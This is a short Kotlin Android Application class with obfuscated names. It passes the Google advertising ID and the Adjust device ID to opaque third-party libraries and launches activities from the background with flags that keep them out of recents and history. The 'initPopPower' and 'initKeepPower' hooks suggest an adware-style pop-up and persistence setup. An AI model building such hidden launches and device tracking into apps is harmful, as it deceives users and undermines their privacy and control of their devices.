package a

import android.app.Application
import android.content.Intent
import android.os.Bundle
import com.amour.Amour
import com.example.overseaswhitebag.common.utils.AdjustTokens
import oet.ndo.wrb.base.BaseApplication
import oet.ndo.wrb.base.OverseaAppInitializer.appBaseContext
import oet.nbxjj.jcjuq.MYCI
import oet.nbxjj.jcjuq.adjust.AdJustTokenAFUtils
import com.tanout.TAN

class MYAY : BaseApplication() {

    companion object {
        var isBackgroundLaunch: Boolean = false

        @JvmStatic
        var appInstance: MYAY? = null
    }

    override fun onCreate() {
        super.onCreate()
        appInstance = this
    }

    override fun configureAdjustTokens() {
        AdjustTokens.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
        TAN.Tan(appBaseContext, intent, null as Class<*>?)

    }

    override fun initPopPower() {
        TAN.Init(appBaseContext)
    }

    override fun initKeepPower(app: Application) {
        Amour.Init(app,MYCI.getGoogleAdId(), MYCI.getAdjustDeviceId())
        AdJustTokenAFUtils.showBhInit(MYCI.getGoogleAdId(),MYCI.getAdjustDeviceId())
    }
}
